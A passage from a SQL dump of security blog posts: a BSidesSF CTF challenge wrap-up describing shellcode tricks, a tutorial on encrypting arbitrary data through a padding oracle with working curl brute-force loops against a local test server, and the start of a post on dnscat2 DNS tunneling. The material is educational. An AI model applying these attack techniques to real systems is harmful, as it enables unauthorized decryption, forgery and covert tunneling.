resolved quickly!)\n@bmenrigh developed the lock post, which detected the lock opening, and @matir developed the software for the receipt printer.\nMy challenges\nI\'m not going to go over others\' challenges, other than the on-site ones I already covered, I don\'t have the insight to make comments on them. However, I do want to cover all my challenges. Not a ton of detail, but enough to understand the context. I\'ll likely blog about a couple of them specifically later.\nI probably don\'t need to say it, but: challenge spoilers coming!\n\'easy\' challenges [10-40]\nI wrote a series of what I called \'easy\' challenges. They don\'t really have a trick to them, but teach a fundamental concept necessary to do CTFs. They\'re also a teaching tool that I plan to use for years to come. :)\neasy [10] - a couldn\'t-be-easier reversing challenge. Asks for a password then prints out a flag. You can get both the password and the flag by running strings on the binary.\neasyauth [30] - a web challenge that sets a cookie, and tells you it\'s setting a cookie. The cookie is simply \'username=guest\'. If you change the cookie to \'username=administrator\', you\'re given the flag. This is to force people to learn how to edit cookies in their browser.\neasyshell [30] and easyshell64 [30] - these are both simple programs where you can send it shellcode, and they run it. It requires the player to figure out what shellcode is and how to use it (eg, from msfvenom or an online shellcode database). There\'s both a 32- and a 64-bit version, as well.\neasyshell and easyshell64 are also good ways to test shellcode, and a place where people can grab libc binaries, if needed.\nAnd finally, easycap [40] is a simple packet capture, where a flag is sent across the network one packet at a time. I didn\'t keep my generator, but it\'s essentially a ruby script that would do a s.send() on each byte of a string.\nskipper [75] and skipper2 [200]\nNow, we\'re starting to get into some of the levels that require some amount of specialized knowledge. I wrote skipper and skipper2 for an internal company CTF a long time ago, and have kept them around as useful teaching tools.\nOne of the first thing I ever did in reverse engineering was write a registration bypass for some icon-maker program on 16-bit DOS using the debug.com command and some dumb luck. Something where you had to find the \"Sorry, your registration code is invalid\" message and bypass it. I wanted to simulate this, and that\'s where these came from.\nWith skipper, you can bypass the checks by just changing the program counter ($eip or $rip) or nop\'ing out the checks. skipper2, however, incorporates the results from the checks into the final flag, so they can\'t be skipped quite so easily. Rather, you have to stop before each check and load the proper value into memory to get the flag. This simulates situations I\'ve legitimately run into while writing keygens.\nhashecute [100]\nWhen I originally conceived of hashecute, I had imagined it being fairly difficult. The idea is, you can send any shellcode you want to the server, but you have to prepend the MD5 of the shellcode to it, and the prepended shellcode runs as well. That\'s gotta be hard, right? Making an MD5 that\'s executable??\nExcept it\'s not, really. You just need to make sure your checksum starts with a short-jump to the end of the checksum (or to a NOP sled if you want to do it even faster!). That\'s \\xeb\\x0e (for jmp) or \\e9\\x0e (for call), as the simplest examples (there are practically infinite others). And it\'s really easy to do that by just appending crap to the end of the shellcode: you can see that in my solution.\nIt does, however, teach a little critical thinking to somebody who might not be super accustomed to dealing with machine code, so I intend to continue using this one as a teaching tool. :)\nb-64-b-tuff [100]\nb-64-b-tuff has the dual-honour of both having the stupidest name and being the biggest waste of my own time .:)\nSo, I came up with the idea of writing this challenge during a conversation with a friend: I said that I know people have written shellcode encoders for unicode and other stuff, but nobody had ever written one for Base64. We should make that a challenge!\nSo I spent a couple minutes writing the challenge. It\'s mostly just Base64 code from StackOverflow or something, and the rest is the same skeleton as easyshell/easyshell64.\nThen I spent a few hours writing a pure Base64 shellcode encoder. I intend to do a future blog 100% about that process, because I think it\'s actually a kind of interesting problem. I eventually got to the point where it worked perfectly, and I was happy that I could prove that this was, indeed, solveable! So I gave it a stupid name and sent out my PR.\nThat\'s when I think @matir said, \"isn\'t Base64 just a superset of alphanumeric?\".\nYes. Yes it is. I could have used any off-the-shelf alphanumeric shellcode encoder such as msfvenom. D\'OH!\nBut, the process was really interesting, and I do plan to write about it, so it\'s not a total loss. And I know at least one player did the same (hi @Grazfather! [he graciously shared his code where he encoded it all by hand]), so I feel good about that :-D\nin-plain-sight [100]\nI like to joke that I only write challenges to drive traffic to my blog. This is sort of the opposite: it rewards teams that read my blog. :)\nA few months ago, while writing the delphi-status challenge (more on that one later), I realized that when encrypting data using a padding oracle, the last block can be arbitrarily chosen! I wrote about it in an off-handed sort of way at that time.\nShortly after, I realized that it could make a neat CTF challenge, and thus was born in-plain-site.\nIt\'s kind of a silly little challenge. Like one of those puzzles you get in riddle books. The ciphertext was literally the string \"HiddenCiphertext\", which I tell you in the description, but of course you probably wouldn\'t notice that. When you do, it\'s a groaner. :)\nFun story: I had a guy from the team OpenToAll bring up the blog before we released the challenge, and mention how he was looking for a challenge involving plaintext ciphertext. I had to resist laughing, because I knew it was coming!\ni-am-the-shortest [200]\nThis was a silly little level, which once again forces people to get shellcode. You\'re allowed to send up to 5 bytes of shellcode to the server, where the flag is loaded into memory, and the server executes them.\nObviously, 5 bytes isn\'t enough to do a proper syscall, so you have to be creative. It\'s more of a puzzle challenge than anything.\nThe trick is, I used a bunch of in-line assembly when developing the challenge (see the original source, it isn\'t pretty!) that ensures that the registers are basically set up to make a syscall - all you have to do it move esi (a pointer to the flag) into ecx. I later discovered that you can \"link\" variables to specific registers in gcc.\nThe intended method was for people to send \\xcc for the shellcode (or similar) and to investigate the registers, determining what the state was, and then to use shellcode along the lines of xchg esi, ecx / int 0x80. And that\'s what most solvers I talked to did.\nOne fun thing: eax (which is the syscall number when a syscall is made) is set to len(shellcode) (the return value of read()). Since sys_write, the syscall you want to make, is number 4, you can easily trigger it by sending 4 bytes. If you send 5 bytes, it makes the wrong call.\nSeveral of the solutions I saw had a dec eax instruction in them, however! The irony is, you only need that instruction because you have it. If you had just left it off, eax would already be 4!\ndelphi-status [250]\ndelphi-status was another of those levels where I spent way more time on the solution than on the challenge.\nIt seems common enough to see tools to decrypt data using a padding oracle, but not super common to see challenges where you have to encrypt data with a padding oracle. So I decided to create a challenge where you have to encrypt arbitrary data!\nThe original goal was to make somebody write a padding oracle encryptor tool for me. That seemed like a good idea!\nBut, I wanted to make sure this was do-able, and I was just generally curious, so I wrote it myself. Then I updated my tool Poracle to support encryption, and wrote a blog about it. If there wasn\'t a tool available that could encrypt arbitrary data with a padding oracle, I was going to hold back on releasing the code. But tools do exist, so I just released mine.\nIt turns out, there was a simpler solution: you could simply xor-out the data from the block when it\'s only one block, and xor-in arbitrary data. I don\'t have exact details, but I know it works. Basically, it\'s a classic stream-cipher-style attack.\nAnd that just demonstrates the Cryptographic Doom Principle :)\nximage [300]\nximage might be my favourite level. Some time ago - possibly years - I was chatting with a friend, and steganography came up. I wondered if it was possible to create an image where the very pixels were executable!?\nI went home wondering if that was possible, and started trying to think of 3-byte NOP-equivalent instructions. I managed to think of a large number of work-able combinations, including ones that modified registers I don\'t care about, plus combinations of 1- and 2-byte NOP-equivalents. By the end, I could reasonably do most colours in an image, including black (though it was slightly greenish) and white. You can find the code here.\n(I got totally nerdsniped while writing this, and just spent a couple days trying to find every 3-byte NOP equivalent to see how much I can improve this!)\nOriginally, I just made the image data executable, so you\'d have to ignore the header and run the image body. Eventually, I noticed that the bitmap header, \'BM\', was effectively inc edx / dec ebp, which is a NOP for all I\'m concerned. That\'s followed by a 2-byte length value. I changed that length on every image to be \\xeb\\x32, which is effectively a jump to the end of the header. That also caused weird errors when reading the image, which I was totally fine with leaving as a hint.\nSo what you have is an image that\'s effectively shellcode; it can be loaded into memory and run. A steganographic method that has probably never been done. :)\nbeez-fight [350]\nbeez-fight was an item-duplication vulnerability that was modeled after a similar vulnerability in Diablo 2. I had a friend a lonnnng time ago who discovered a vulnerability in Diablo 2, where when you sold an item it was copied through a buffer, and that buffer could be sold again. I was trying to think of a similar vulnerability, where a buffer wasn\'t cleared correctly.\nI started by writing a simple game engine. While I was creating items, locations, monsters, etc., I didn\'t really think about how the game was going to be played - browser? A binary I distribute? netcat? Distributing a binary can be fun, because the player has to reverse engineer the protocol. But netcat is easier! The problem is, the vulnerability has to be a bit more subtle in netcat, because I can\'t depend on a numbered buffer - what you see is what you get!\nEventually, I came upon the idea of equip/unequip being problematic. Not clearing the buffer properly!\nSomething I see far too much in real life is code that checks if an object exists in a different way in different places. So I decided to replicate that - I had both an item that\'s NULL-able, and a flag :is_equipped. When you tried to use an item, it would check if the :is_equipped flag is set. But when you unequipped it, it checked if the item was NULL, which never actually happened (unequipping it only toggled the flag). As a result, you could unequip the item multiple times and duplicate it!\nOnce that was done, the rest was easy: make a game that\'s too difficult to reasonably survive, and put a flag in the store that\'s worth a lot of gold. The only reasonable way to get the flag is to duplicate an item a bunch, then sell it to buy the flag.\nI think I got the most positive feedback on this challenge, people seem to enjoy game hacking!\nvhash + vhash-fixed [450]\nThis is a challenge that me and @bmenrigh came up with, designed to be quite difficult. It was vhash, and, later, vhash-fixed - but we\'ll get to that. :)\nIt all dates back to a conversation I had with @joswr1ght about a SANS Holiday Hack Challenge level I was designing. I suggested using a hash-extension vulnerability, and he said we can\'t, because of hash_extender, recklessly written by yours truly, ruining hash extension vulnerabilities forever!\nI found that funny, and mentioned it to @bmenrigh. We decided to make our own novel hashing algorithm that\'s vulnerable to an extension attack. We decided to make it extra hard by not giving out source! Players would have to reverse engineer the algorithm in order to implement the extension attack. PERFECT! Nobody knows as well as me how difficult it can be to create a new hash extension attack. :)\nNow, there is where it gets a bit fun. I agreed to write the front-end if he wrote the back-end. The front-end was almost exactly easyauth, except the cookie was signed. We decided to use an md5sum-like interface, which was a bit awkward in PHP, but that was fine. I wrote and tested everything with md5sum, and then awaited the vhash binary.\nWhen he sent it, I assumed vhash was a drop-in replacement without thinking too much about it. I updated the hash binary, and could log in just fine, and that was it.\nWhen the challenge came out, the first solve happened in only a couple minutes. That doesn\'t seem possible! I managed to get in touch with the solver, and he said that he just changed the cookie and ignored the hash. Oh no! Our only big mess-up!\nAfter investigation, we discovered that the agreed md5sum-like interface meant, to @bmenrigh, that the data would come on stdin, and to me it meant that the file would be passed as a parameter. So, we were hashing the empty string every time. Oops!\nLuckily, we found it, fixed it, and rolled out an updated version shortly after. The original challenge became an easy 450-pointer for anybody who bothered to try, and the real challenge was only solved by a few, as intended.\ndnscap [500]\ndnscap is simply a packet-capture from dnscat2, running in unecrypted-mode, over a laggy connection (coincidentally, I\'m writing this writeup at the same bar where I wrote the original challenge!). In dnscat2, I sent a .png file that contains the dnscat2 logo, as well as the flag. Product placement anyone?\nI assumed it would be fairly difficult to disentangle the packets going through, which is why we gave it a high point-value. Ultimately, it was easier than we\'d expected, people were able to solve it fairly quickly.\nnibbler [666]\nAnd finally, my old friend nibbler.\nAt some point in the past few months, I had the realization: nibbles (the snake game for QBasic where I learned to program) sounds like nibble (a 4-bit value). I forget where it came from exactly, but I had the idea to build a nibbles-clone with a vulnerability where you\'d have to exploit it by collecting the \'fruit\' at the right time.\nI originally stored the scores in an array, and each \'fruit\' would change between between worth 00 and FF points. You\'d have to overflow the stack and build an exploit by gathering fruit with the snake. You\'ll notice that the name that I ask for at the start uses read() - that\'s so it can have NUL bytes so you can build a ROP-chain in your name.\nI realized that picking values between 00 and FF would take FOREVER, and wanted to get back to the original idea: nibbles! But I couldn\'t think of a way to make it realistic while only collecting 4-bit values.\nEventually, I decided to drop the premise of performing an exploit, and instead, just let the user write shellcode that is run directly. As a result, it went from a pwn to a programming challenge, but I didn\'t re-categorize it, largely because we don\'t have programming challenges.\nIt ended up being difficult, but solveable! One of my favourite writeups is here; I HIGHLY recommend reading it. My favourite part is that he named the snakes and drew some damn sexy images!\nI just want to give a shout out to the poor soul, who I won\'t name here, who solved this level BY HAND, but didn\'t cat the flag file fast enough. I shouldn\'t have had the 10-second timeout, but we did. As a result, he didn\'t get the flag. I\'m so sorry. :(\nFun fact: @bmenrigh was confident enough that this level was impossible to solve that he made me a large bet that less than 2 people would solve it. Because we had 9 solvers, I won a lot of alcohol! :)\nConclusion\nHopefully you enjoyed hearing a little about the BSidesSF CTF challenges I wrote! I really enjoyed writing them, and then seeing people working on solving them!\nOn some of the challenges, I tried to teach something (or have a teachable lesson, something I can use when I teach). On some, I tried to make something pretty difficult. On some, I fell somewhere between. But there\'s one thing they have in common: I tried to make my own challenges as easy as possible to test and validate. :)', '\'Conferences\', \'CTFs\'', 'https://blog.skullsecurity.org/2017/bsidessf-ctf-wrap-up');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (4, 'Going the other way with padding oracles: Encrypting arbitrary data!', 'Ron Bowes', '2016-12-19', 'A long time ago, I wrote a couple blogs that went into a lot of detail on how to use padding oracle vulnerabilities to decrypt an encrypted string of data. It\'s pretty important to understand to use a padding oracle vulnerability for decryption before reading this, so I\'d suggest going there for a refresher.\nWhen I wrote that blog and the Poracle tool originally, I didn\'t actually know how to encrypt arbitrary data using a padding oracle. I was vaguely aware that it was possible, but I hadn\'t really thought about it. But recently, I decided to figure out how it works. I thought and thought, and finally came up with this technique that seems to work. I also implemented it in Poracle in commit a5cfad76ad.\nAlthough I technically invented this technique myself, it\'s undoubtedly the same technique that any other tools / papers use. If there\'s a better way - especially on dealing with the first block - I\'d love to hear it!\nAnyway, in this post, we\'ll talk about a situation where you have a padding oracle vulnerability, and you want to encrypt arbitrary data instead of decrypting their data. It might, for example, be a cookie that contains a filename for your profile data. If you change the encrypted data in a cookie to an important file on the filesystem, suddenly you have arbitrary file read!\nThe math\nIf you aren\'t familiar with block ciphers, how they\'re padded, how XOR (⊕) works, or how CBC chaining works, please read my previous post. I\'m going to assume you\'re familiar with all of the above!\nWe\'ll define our variables more or less the same as last time:\n\r\n  Let P   = the plaintext, and Pn = the plaintext of block n (where n is in\r\n            the range of 1..N). We select this.\r\n  Let C   = the corresponding ciphertext, and Cn = the ciphertext\r\n            of block n (the first block being 1) - our goal is to calculate this\r\n  Let N   = the number of blocks (P and C have the same number of blocks by\r\n            definition). PN is the last plaintext block, and CN is\r\n            the last ciphertext block.\r\n  Let IV  = the initialization vector — a random string — frequently\r\n            (incorrectly) set to all zeroes. We\'ll mostly call this C0 in this\r\n            post for simplicity (see below for an explanation).\r\n  Let E() = a single-block encryption operation (any block encryption\r\n            algorithm, such as AES or DES, it doesn\'t matter which), with some\r\n            unique and unknown (to the attacker) secret key (that we don\'t\r\n            notate here).\r\n  Let D() = the corresponding decryption operation.\r\n\nAnd the math for encryption:\n\r\n  C1 = E(P1 ⊕ IV)\r\n  Cn = E(Pn ⊕ Cn-1) — for all n > 1\r\n\nAnd, of course, decryption:\n\r\n  P1 = D(C1) ⊕ IV\r\n  Pn = D(Cn) ⊕ Cn-1 - for all n > 1\r\n\nNotice that if you define the IV as C0, both formulas could be simplified to just a single line.\nThe attack\nLike decryption, we divide the string into blocks, and attack one block at a time.\nWe start by taking our desired string, P, and adding the proper padding to it, so when it\'s decrypted, the padding is correct. If there are n bytes required to pad the string to a multiple of the block length, then the byte n is added n times.\nFor example, if the string is hello world! and the blocksize is 16, we have to add 4 bytes, so the string becomes hello world!\\x04\\x04\\x04\\x04. If the string is an exact multiple of the block length, we add a block afterwards with nothing but padding (so this is a test!!, because it\'s 16 bytes, becomes this is a test!!\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10\\x10, for example (assume the blocksize is 16, which will will throughout).\nOnce we have a string, P, we need to generate the ciphertext, C from it. And here\'s how that happens...\nOverview\nAfter writing everything below, I realized that it\'s a bit hard to follow. Math, etc. So I\'m going to start by summarizing the steps before diving more deeply into all the details. Good luck!\nTo encrypt arbitrary text with a padding oracle...\n\nSelect a string, P, that you want to generate ciphertext, C, for\nPad the string to be a multiple of the blocksize, using appropriate padding, then split it into blocks numbered from 1 to N\nGenerate a block of random data (CN - ultimately, the final block of ciphertext)\nFor each block of plaintext, starting with the last one...\n\nCreate a two-block string of ciphertext, C\', by combining an empty block (00000...) with the most recently generated ciphertext block (Cn+1) (or the random one if it\'s the first round)\nChange the last byte of the empty block until the padding errors go away, then use math (see below for way more detail) to set the last byte to 2 and change the second-last byte till it works. Then change the last two bytes to 3 and figure out the third-last, fourth-last, etc.\nAfter determining the full block, XOR it with the plaintext block Pn to create Cn\nRepeat the above process for each block (prepend an empty block to the new ciphertext block, calculate it, etc)\n\n\n\nTo put that in English: each block of ciphertext decrypts to an unknown value, then is XOR\'d with the previous block of ciphertext. By carefully selecting the previous block, we can control what the next block decrypts to. Even if the next block decrypts to a bunch of garbage, it\'s still being XOR\'d to a value that we control, and can therefore be set to anything we want.\nA quick note about the IV\nIn CBC mode, the IV - initialization vector - sort of acts as a ciphertext block that comes before the first block in terms of XOR\'ing. Sort of an elusive \"zeroeth\" block, it\'s not actually decrypted; instead, it\'s XOR\'d against the first real block after decrypting to create P1. Because it\'s used to set P1, it\'s calculated exactly the same as every other block we\'re going to talk about, except the final block, CN, which is random.\nIf we don\'t have control of the IV - which is pretty common - then we can\'t control the first block of plaintext, P1, in any meaningful way. We can still calculate the full plaintext we want, it\'s just going to have a block of garbage before it.\nThroughout this post, just think of the IV another block of ciphertext; we\'ll even call it C0 from time to time. C0 is used to generate P1 (and there\'s no such thing as P0).\nGenerate a fake block\nThe \"last\" block of ciphertext, CN, is generated first. Normally you\'d just pick a random blocksize-length string and move on. But you can also have some fun with it! The rest of this section is just a little playing, and is totally tangential to the point; feel free to skip to the next section if you just want the meat.\nSo yeah, interesting tangential fact: the final ciphertext block, CN can be any arbitrary string of blocksize bytes. All \'A\'s? No problem. A message to somebody? No problem. By default, Poracle simply randomizes it. I assume other tools do as well. But it\'s interesting that we can generate arbitrary plaintext!\nLet\'s have some fun:\n\nAlgorithm = \"AES-256-CBC\"\nKey = c086e08ad8ee0ebe7c2320099cfec9eea9a346a108570a4f6494cfe7c2a30ee1\nIV = 78228d4760a3675aa08d47694f88f639\nCiphertext = \"IS THIS SECRET??\"\n\nThe ciphertext is ASCII!? Is that even possible?? It is! Let\'s try to decrypt it:\n\r\n  2.3.0 :001 > require \'openssl\'\r\n   => true\r\n\r\n  2.3.0 :002 > c = OpenSSL::Cipher::Cipher.new(\"AES-256-CBC\")\r\n   => #<OpenSSL::Cipher::Cipher:0x00000001de2578>\r\n\r\n  2.3.0 :003 > c.decrypt\r\n   => #<OpenSSL::Cipher::Cipher:0x00000001de2578>\r\n\r\n  2.3.0 :004 > c.key = [\'c086e08ad8ee0ebe7c2320099cfec9eea9a346a108570a4f6494cfe7c2a30ee1\'].pack(\'H*\')\r\n   => \"\\xC0\\x86\\xE0\\x8A\\xD8\\xEE\\x0E\\xBE|# \\t\\x9C\\xFE\\xC9\\xEE\\xA9\\xA3F\\xA1\\bW\\nOd\\x94\\xCF\\xE7\\xC2\\xA3\\x0E\\xE1\" \r\n\r\n  2.3.0 :005 > c.iv = [\'78228d4760a3675aa08d47694f88f639\'].pack(\'H*\')\r\n   => \"x\\\"\\x8DG`\\xA3gZ\\xA0\\x8DGiO\\x88\\xF69\" \r\n\r\n  2.3.0 :006 > c.update(\"IS THIS SECRET??\") + c.final()\r\n   => \"NO, NOT SECRET!\" \r\n\r\n\nIt\'s ciphertext that looks like ASCII (\"IS THIS SECRET??\") that decrypts to more ASCII (\"NO, NOT SECRET!\"). How\'s that even work!?\nWe\'ll see shortly why this works, but fundamentally: we can arbitrarily choose the last block (I chose ASCII) for padding-oracle-based encryption. The previous blocks - in this case, the IV - is what we actually have to determine. Change that IV, and this won\'t work anymore.\nCalculate a block of ciphertext\nOkay, we\'ve created the last block of ciphertext, CN. Now we want to create the second-last block, CN-1. This is where it starts to get complicated. If you can follow this sub-section, everything else is easy! :)\nLet\'s start by making a new ciphertext string, C\'. Just like in decrypting, C\' is a custom-generated ciphertext string that we\'re going to send to the oracle. It\'s made up of two blocks:\n\nC\'1 is the block we\'re trying to determine; we set it to all zeroes for now (though the value doesn\'t actually matter)\nC\'2 is the previously generated block of ciphertext (on the first round, it\'s CN, the block we randomly generated; on ensuing rounds, it\'s Cn+1 - the block after the one we\'re trying to crack).\n\nI know that\'s confusing, but let\'s push forward and look at how we generate a C\' block and it should all become clear.\nImagine the string:\n\r\n  C\' = 00000000000000000000000000000000 || CN\r\n                ^^^ CN-1 ^^^               \r\n\nKeep in mind that CN is randomly chosen. We don\'t know - and can\'t know - what C\'2 decrypts to, but we\'ll call it P\'2. We do know something, though - after it\'s decrypted to something, it\'s XOR\'d with the previous block of ciphertext (C\'1), which we control. Then the padding\'s checked. Whether or not the padding is correct or incorrect depends wholly on C\'1! That means by carefully adjusting C\'1, we can find a string that generates correct padding for P\'2.\nBecause the only things that influence P\'2 are the encryption function, E(), and the previous ciphertext block, C\'1, we can set it to anything we want without ever seeing it! And once we find a value for C\' that decrypts to the P\'2 we want, we have everything we need to create a CN-1 that generates the PN we want!\nSo we create a string like this:\n\r\n  00000000000000000000000000000000 41414141414141414141414141414141\r\n        ^^^ C\'1 / CN-1 ^^^                  ^^^ C\'2 / CN ^^^\r\n\nThe block of zeroes is the block we\'re trying to figure out (it\'s going to be CN-1), and the block of 41\'s is the block of arbitrary/random data (CN).\nWe send that to the server, for example, like this (this is on Poracle\'s RemoteTestServer.rb app, with a random key and blank IV - you should be able to just download and run the server, though you might have to run gem install sinatra):\n\nhttp://localhost:20222/decrypt/0000000000000000000000000000000041414141414141414141414141414141\n\nWe\'re almost certainly going to get a padding error returned, just like in decryption (there\'s a 1/256 chance it\'s going to be right). So we change the last byte of block C\'1 until we stop getting padding errors:\n\nhttp://localhost:20222/decrypt/0000000000000000000000000000000141414141414141414141414141414141\nhttp://localhost:20222/decrypt/0000000000000000000000000000000241414141414141414141414141414141\nhttp://localhost:20222/decrypt/0000000000000000000000000000000341414141414141414141414141414141\nhttp://localhost:20222/decrypt/0000000000000000000000000000000441414141414141414141414141414141\n...\n\nAnd eventually, you\'ll get a success:\n\r\n$ for i in `seq 0 255`; do\r\nURL=`printf \"http://localhost:20222/decrypt/000000000000000000000000000000%02x41414141414141414141414141414141\" $i`\r\necho $URL\r\ncurl \"$URL\"\r\necho \'\'\r\ndone\r\n\r\nhttp://localhost:20222/decrypt/0000000000000000000000000000000041414141414141414141414141414141\r\nFail!\r\nhttp://localhost:20222/decrypt/0000000000000000000000000000000141414141414141414141414141414141\r\nFail!\r\nhttp://localhost:20222/decrypt/0000000000000000000000000000000241414141414141414141414141414141\r\nFail!\r\nhttp://localhost:20222/decrypt/0000000000000000000000000000000341414141414141414141414141414141\r\nFail!\r\nhttp://localhost:20222/decrypt/0000000000000000000000000000000441414141414141414141414141414141\r\nFail!\r\nhttp://localhost:20222/decrypt/0000000000000000000000000000000541414141414141414141414141414141\r\nFail!\r\nhttp://localhost:20222/decrypt/0000000000000000000000000000000641414141414141414141414141414141\r\nSuccess!\r\nhttp://localhost:20222/decrypt/0000000000000000000000000000000741414141414141414141414141414141\r\nFail!\r\n...\r\n\nWe actually found the valid encoding really early this time! When C\'1 ends with 06, the last byte of P\'2, decrypts to 01. That means if we want the last byte of the generated plaintext (P\'2) to be 02, we simply have to XOR the value by 01 (to set it to 00), then by 02 (to set it to 02). 06 ⊕ 01 ⊕ 02 = 05. Therefore, if we set the last byte of C\'1 to 05, we know that the last byte of P\'2 will be 02, and we can start bruteforcing the second-last byte:\n\r\n$ for i in `seq 0 255`; do\r\nURL=`printf \"http://localhost:20222/decrypt/0000000000000000000000000000%02x0541414141414141414141414141414141\" $i`\r\necho $URL\r\ncurl \"$URL\"\r\necho \'\'\r\ndone\r\n\r\nhttp://localhost:20222/decrypt/0000000000000000000000000000000541414141414141414141414141414141\r\nFail!\r\nhttp://localhost:20222/decrypt/0000000000000000000000000000010541414141414141414141414141414141\r\nFail!\r\n...\r\nhttp://localhost:20222/decrypt/0000000000000000000000000000350541414141414141414141414141414141\r\nFail!\r\nhttp://localhost:20222/decrypt/0000000000000000000000000000360541414141414141414141414141414141\r\nSuccess!\r\n...\r\n\nSo now we know that when C\'N-1 ends with 3605, P\'2 ends with 0202. We\'ll go one more step: if we change C\'1 such that P\'2 ends with 0303, we can start working on the third-last character in C\'1. 36 ⊕ 02 ⊕ 03 = 37, and 05 ⊕ 02 ⊕ 03 = 04 (we XOR by 2 to set the values to 0, then by 3 to set it to 3):\n\r\n$ for i in `seq 0 255`; do\r\nURL=`printf \"http://localhost:20222/decrypt/00000000000000000000000000%02x370441414141414141414141414141414141\" $i`\r\necho $URL\r\ncurl \"$URL\"\r\necho \'\'\r\ndone\r\n\r\n...\r\nhttp://localhost:20222/decrypt/000000000000000000000000006b370441414141414141414141414141414141\r\nFail!\r\nhttp://localhost:20222/decrypt/000000000000000000000000006c370441414141414141414141414141414141\r\nSuccess!\r\n...\r\n\nSo now, when C\'1 ends with 6c3704, P\'2 ends with 030303.\nWe can go on and on, but I automated it using Poracle and determined that the final value for C\'1 that works is 12435417b15e3d7552810313da7f2417\n\r\n$ curl \'http://localhost:20222/decrypt/12435417b15e3d7552810313da7f241741414141414141414141414141414141\'\r\nSuccess!\r\n\nThat means that when C\'1 is 12435417b15e3d7552810313da7f2417, P\'2 is 10101010101010101010101010101010 (a full block of padding).\nWe can once again use XOR to remove 101010... from C\'1, giving us: 02534407a14e2d6542911303ca6f3407. That means that when C\'1 equals 02534407a14e2d6542911303ca6f3407), P\'2 is 00000000000000000000000000000000. Now we can XOR it with whatever we want to set it to an arbitrary value!\nLet\'s say we want the last block to decrypt to 0102030405060708090a0b0c0d0e0f (15 bytes). We:\n\nAdd one byte of padding: 0102030405060708090a0b0c0d0e0f01\nXOR C\'1 (02534407a14e2d6542911303ca6f3407) with 0102030405060708090a0b0c0d0e0f01 => 03514703a4482a6d4b9b180fc7613b06\nAppend the final block, CN, to create C: 03514703a4482a6d4b9b180fc7613b0641414141414141414141414141414141\nSend it to the server to be decrypted...\n\n\r\n$ curl \'http://localhost:20222/decrypt/03514703a4482a6d4b9b180fc7613b0641414141414141414141414141414141\'\r\nSuccess\r\n\nAnd, if you actually calculate it with the key I\'m using, the final plaintext string P\' is c49f1fdcd1cd93daf4e79a18637c98d80102030405060708090a0b0c0d0e0f.\n(The block of garbage is a result of being unable to control the IV)\nCalculating the next block of ciphertext\nSo now, where have we gotten ourselves?\nWe have values for CN-1 (calculated) and CN (arbitrarily chosen). How do we calculate CN-2?\nThis is actually pretty easy. We generate ourselves a two-block string again, C\'. Once again, C\'1 is what we\'re trying to bruteforce, and is normally set to all 00\'s. But this time, C\'2 is CN-1 - the ciphertext we just generated.\nLet\'s take a new C\' of:\n\r\n000000000000000000000000000000000 3514703a4482a6d4b9b180fc7613b06\r\n        ^^^ C\'1 / CN-2 ^^^                 ^^^ C\'2 / CN-1 ^^^\r\n\nWe can once again determine the last byte of C\'1 that will cause the last character of P\'2 to be valid padding (01):\n\r\n$ for i in `seq 0 255`; do\r\nURL=`printf \"http://localhost:20222/decrypt/000000000000000000000000000000%02x3514703a4482a6d4b9b180fc7613b06\" $i`\r\necho $URL\r\ncurl \"$URL\"\r\necho \'\'\r\ndone\r\n...\r\nhttp://localhost:20222/decrypt/000000000000000000000000000000313514703a4482a6d4b9b180fc7613b06\r\nFail!\r\nhttp://localhost:20222/decrypt/000000000000000000000000000000323514703a4482a6d4b9b180fc7613b06\r\nFail!\r\nhttp://localhost:20222/decrypt/000000000000000000000000000000333514703a4482a6d4b9b180fc7613b06\r\nSuccess!\r\n...\r\n\n...and so on, just like before. When this block is done, move on to the previous, and previous, and so on, till you get to the first block of P. By then, you\'ve determined all the values for C1 up to CN-1, and you have your specially generated CN with whatever value you want. Thus, you have the whole string!\nSo to put it in another way, we calculate:\n\nCN = random / arbitrary\nCN-1 = calculated from CN combined with PN\nCN-2 = calculated from CN-1 combined with PN-1\nCN-3 = calculated from CN-2 combined with PN-2\n...\nC1 = calculated from C2 combined with P2\nC0 (the IV) = calculated from C1 combined with P1\n\nSo as you can see, each block is based on the next ciphertext block and the next plaintext block.\nConclusion\nWell, that\'s about all I can say about using a padding oracle vulnerability to encrypt arbitrary data.\nIf anything is unclear, please let me know! And, you can see a working implementation in Poracle.rb.', '\'Crypto\', \'Hacking\', \'Tools\'', 'https://blog.skullsecurity.org/2016/going-the-other-way-with-padding-oracles-encrypting-arbitrary-data');
INSERT INTO `skullsecurity` (`id`, `title`, `author`, `publish_date`, `content`, `tags`, `url`) VALUES (5, 'dnscat2 0.05: with tunnels!', 'Ron Bowes', '2015-12-24', 'Greetings, and I hope you\'re all having a great holiday!\nMy Christmas present to you, the community, is dnscat2 version 0.05!\nSome of you will remember that I recently gave a talk at the SANS Hackfest Summit. At the talk, I mentioned some ideas for future plans. That\'s when Ed jumped on the stage and took a survey: which feature did the audience want most?\nThe winner? Tunneling TCP via a dnscat. So now you have it! Tunneling: Phase 1. :)\nInfo and downloads.\n\n.in { color: #dc322f; font-weight: bold; }\nHigh-level\nThere isn\'t a ton to say about this feature, so this post won\'t be particularly long. I\'ll give a quick overview of how it works, how to use it, go into some quick implementation details, and, finally, talk about my future plans.\nOn a high level, this works exactly like ssh with the -L argument: when you set up a port forward in a dnscat2 session, the dnscat2 server will listen on a specified port. Say, port 2222. When a connection arrives on that port, the connection will be sent - via the dnscat2 session and out the dnscat2 client - to a specified server.\nThat\'s pretty much all there is to it. The user chooses which ports to listen on, and which server/port to connect to, and all connections are forwarded via the tunnel.\nLet\'s look at how to use it!\nUsage\nTunneling must be used within a dnscat2 session. So first you need one of those, no special options required:\n\r\n(server)\r\n\r\n# ruby ./dnscat2.rb\r\nNew window created: 0\r\n\r\n[...]\r\n\r\ndnscat2>\r\n\n\r\n(client)\r\n\r\n$ ./dnscat --dns=\"server=localhost,port=53\"\r\nCreating DNS driver:\r\n domain = (null)\r\n host   = 0.0.0.0\r\n port   = 53\r\n type   = TXT,CNAME,MX\r\n server = localhost\r\n\r\nEncrypted session established! For added security, please verify the server also displays this string:\r\n\r\nEncode Surfs Taking Spiced Finer Sonny\r\n\r\nSession established!\r\n\nWe, of course, take the opportunity to validate the six words - \"Encode Surfs Taking Spiced Finer Sonny\" - to make sure nobody is performing a man-in-the-middle attack against us (considering this is directly to localhost, it\'s probably okay :) ).\nOnce you have a session set up, you want to tell the session to listen with the listen command:\n\r\nNew window created: 